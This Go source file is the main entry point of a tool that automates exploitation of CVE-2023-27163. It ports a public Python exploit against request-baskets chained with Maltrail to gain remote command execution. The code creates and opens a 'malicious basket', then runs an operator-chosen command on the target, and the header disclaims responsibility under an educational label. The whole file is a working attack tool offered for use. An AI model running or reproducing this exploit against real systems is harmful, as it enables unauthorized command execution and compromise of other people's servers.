// this package is designed to streamline/automate the exploitation
// of CVE-2023-27163. this is designed to be the Golang version of
// the Python3 exploit found at https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53/blob/main/exploit.py.
//
// this is for educational and white-hat purposed only. any illegal
// or unauthorized use of this is the sole responsibility of the
// person using it for non white-hat and non educational purposes.
//
// the author takes no responsibility for your use of this tool.
// your actions are your own.
package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/thomas-osgood/OGOR/output"
)

func init() {
	var err error

	printer, err = output.NewOutputter()
	if err != nil {
		log.Fatalf("error settingup outputter: %s\n", err.Error())
	}

	return
}

func main() {
	var baseurl string
	var command string
	var err error
	var exploiter *Exploiter

	flag.StringVar(&baseurl, "d", "http://127.0.0.1:55555", "address of target (including scheme)")
	flag.StringVar(&command, "c", "sleep 10", "command to execute on the target")
	flag.Parse()

	exploiter, err = NewExploiter(WithBaseurl(baseurl))
	if err != nil {
		printer.ErrMsg(err.Error())
		os.Exit(1)
	}

	printer.SysMsgNB("creating malicious basket ...")
	err = exploiter.MakeMaliciousBasket()
	if err != nil {
		printer.ErrMsg(err.Error())
		os.Exit(1)
	}
	printer.SucMsg(fmt.Sprintf("malicious basket created: %s", exploiter.basketName))

	printer.SysMsgNB("opening malicious basket ...")
	err = exploiter.OpenMaliciousBasket()
	if err != nil {
		printer.ErrMsg(err.Error())
		os.Exit(1)
	}
	printer.SucMsg("basket successfully opened")

	printer.SysMsgNB("executing command on target ...")
	err = exploiter.ExecuteCommand(command)
	if err != nil {
		printer.ErrMsg(err.Error())
		os.Exit(1)
	}
	printer.SucMsg("exploit completed successfully")

	return
}
